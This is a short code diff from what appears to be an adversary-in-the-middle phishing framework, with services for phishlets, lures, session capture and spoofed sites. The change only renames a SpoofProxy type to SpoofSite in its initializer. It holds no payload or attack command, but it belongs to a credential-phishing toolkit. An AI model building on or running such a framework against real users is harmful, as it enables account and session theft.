@@ -72,7 +72,7 @@ type initializer struct {
 	lureSvc       *aitm.LureService
 	blacklistSvc  *aitm.BlacklistService
 	puppetSvc     *aitm.PuppetService
-	spoofProxy    *proxy.SpoofProxy
+	spoofProxy    *proxy.SpoofSite
 	wsHub         *proxy.WSHub
 }
 
@@ -222,7 +222,7 @@ func (ini *initializer) initServices() error {
 	ini.sessionStore = sqlite.NewSessionStore(ini.db)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
-	ini.spoofProxy = proxy.NewSpoofProxy(ini.cfg.SpoofURL, ini.logger)
+	ini.spoofProxy = proxy.NewSpoofSite(ini.cfg.SpoofURL, ini.logger)
 
 	var phishletSvc *aitm.PhishletService
 	if len(ini.dnsProviders) == 0 {
